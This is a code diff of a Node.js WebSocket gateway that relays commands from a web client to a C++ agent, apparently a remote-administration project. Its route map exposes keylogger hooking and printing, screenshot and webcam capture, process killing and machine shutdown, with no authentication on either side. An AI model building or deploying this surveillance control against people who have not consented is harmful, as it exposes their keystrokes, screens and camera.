@@ -1,58 +1,127 @@
 const WebSocket = require('ws');
 
+// Cấu hình Server
+const PORT = 8080;
+const wss = new WebSocket.Server({ port: PORT, maxPayload: 50 * 1024 * 1024 });
 
-// Khởi tạo WebSocket server
-const wss = new WebSocket.Server({ port: 8080 }, () => {
-  console.log('WebSocket server running on ws://localhost:8080');
-});
+console.log(`Gateway đang chạy tại ws://localhost:${PORT}`);
 
-// Biến giữ client
 let webClient = null;
-let agentClient = null; // agent cố định "cpp_server"
+let agentClient = null;
+let activeContext = null; 
+
+// BẢNG ĐỊNH TUYẾN (ROUTE MAP)
+const ROUTE_MAP = {
+    // --- APP ---
+    '/application/list':  { command: 'APPLICATION', action: 'XEM' },
+    '/application/kill':  { command: 'APPLICATION', action: 'KILL' },
+    '/application/start': { command: 'APPLICATION', action: 'START' },
+    '/application/quit':  { command: 'APPLICATION', action: 'QUIT' },
+
+    // --- PROCESS ---
+    '/process/list':  { command: 'PROCESS', action: 'XEM' },
+    '/process/kill':  { command: 'PROCESS', action: 'KILL' },
+    '/process/start': { command: 'PROCESS', action: 'START' },
+    '/process/quit':  { command: 'PROCESS', action: 'QUIT' },
+
+    // --- KEYLOGGER ---
+    '/keylog/start': { command: 'KEYLOG', action: 'HOOK' },
+    '/keylog/stop':  { command: 'KEYLOG', action: 'UNHOOK' },
+    '/keylog/print': { command: 'KEYLOG', action: 'PRINT' },
+    '/keylog/quit':  { command: 'KEYLOG', action: 'QUIT' },
+
+    // --- SCREENSHOT (TAKEPIC) ---
+    '/screenshot/take': { command: 'TAKEPIC', action: 'TAKE' },
+    '/screenshot/quit': { command: 'TAKEPIC', action: 'QUIT' },
+
+    // --- WEBCAM ---
+    '/webcam/start': { command: 'WEBCAM', action: 'START' },
+    '/webcam/stop':  { command: 'WEBCAM', action: 'STOP' },
+    '/webcam/quit':  { command: 'WEBCAM', action: 'QUIT' },
+
+    // --- SYSTEM ---
+    '/shutdown': { command: 'SHUTDOWN' },
+    '/restart':  { command: 'RESTART' }
+};
 
 wss.on("connection", (ws) => {
-  console.log("A client connected. Waiting for register...");
+    ws.role = "unknown";
 
-  ws.role = null;
+    ws.on("message", (message) => {
+        let data;
+        try {
+            data = JSON.parse(message);
+        } catch (e) {
+            console.log("Lỗi JSON:", message);
+            return;
+        }
 
-  ws.on("message", (msg) => {
-    let data;
-    try {
-      data = JSON.parse(msg);
-    } catch (err) {
-      console.log("Invalid JSON:", msg);
-      return; // ignore non-JSON messages
-    }
+        // 1. ĐĂNG KÝ
+        if (data.type === "register") {
+            ws.role = data.role;
+            if (ws.role === "web_client") {
+                webClient = ws;
+                console.log("Web Client đã kết nối.");
+            } else if (ws.role === "agent" || ws.role === "cpp_server") {
+                agentClient = ws;
+                console.log("Agent C++ đã kết nối.");
+                activeContext = null; 
+            }
+            return;
+        }
 
-    // Handle registration
-    if (data.type === "register") {
-      ws.role = data.role;
-      console.log("Client registered as:", ws.role);
+        // 2. WEB CLIENT GỬI LỆNH
+        if (ws === webClient) {
+            if (!agentClient) {
+                ws.send(JSON.stringify({ type: 'ERROR', data: 'Agent chưa online!' }));
+                return;
+            }
 
-      if (ws.role === "web_client") {
-        webClient = ws;
-        console.log("Web client connected");
-      } else if (ws.role === "agent") {
-        agentClient = ws;
-        console.log("Agent (cpp_server) connected");
-      } else {
-        console.log("Unknown role, disconnecting");
-        ws.close();
-      }
-      return;
-    }
+            const endpoint = data.endpoint;
+            const params = data.params || {};
+            const route = ROUTE_MAP[endpoint];
 
-    // --- ROUTING LOGIC ---
-    if (ws === webClient && agentClient) {
-      agentClient.send(msg);
-    } else if (ws === agentClient && webClient) {
-      webClient.send(msg);
-    }
-  });
+            if (route) {
+                const targetCommand = route.command;
 
-  ws.on('close', () => {
-    console.log(`${ws.role} disconnected`);
-    if (ws.role === 'web_client') webClient = null;
-    if (ws.role === 'agent') agentClient = null;
-  });
+                // TỰ ĐỘNG CHUYỂN NGỮ CẢNH (AUTO QUIT)
+                if (activeContext && activeContext !== targetCommand) {
+                    // Nếu là Shutdown/Restart thì không cần Quit ngữ cảnh cũ, cứ thế mà tắt máy
+                    if (targetCommand !== 'SHUTDOWN' && targetCommand !== 'RESTART') {
+                        console.log(`🔄 Auto-Quit: [${activeContext}]`);
+                        agentClient.send(JSON.stringify({ command: activeContext, action: 'QUIT' }));
+                    }
+                }
+
+                // Cập nhật ngữ cảnh
+                if (['SHUTDOWN', 'RESTART'].includes(targetCommand)) {
+                    activeContext = null;
+                } else if (route.action === 'QUIT') {
+                    activeContext = null;
+                } else {
+                    activeContext = targetCommand;
+                }
+
+                const finalPacket = { ...route, ...params };
+                console.log(`Routing [${endpoint}] -> Agent:`, JSON.stringify(finalPacket));
+                agentClient.send(JSON.stringify(finalPacket));
+            }
+        }
+
+        // 3. AGENT GỬI PHẢN HỒI
+        else if (ws === agentClient) {
+            if (webClient) webClient.send(message);
+        }
+    });
+
+    ws.on('close', () => {
+        if (ws === agentClient) {
+            console.log("Agent mất kết nối.");
+            agentClient = null; activeContext = null;
+        }
+        if (ws === webClient) {
+            console.log("Web Client thoát.");
+            webClient = null;
+        }
+    });
 });
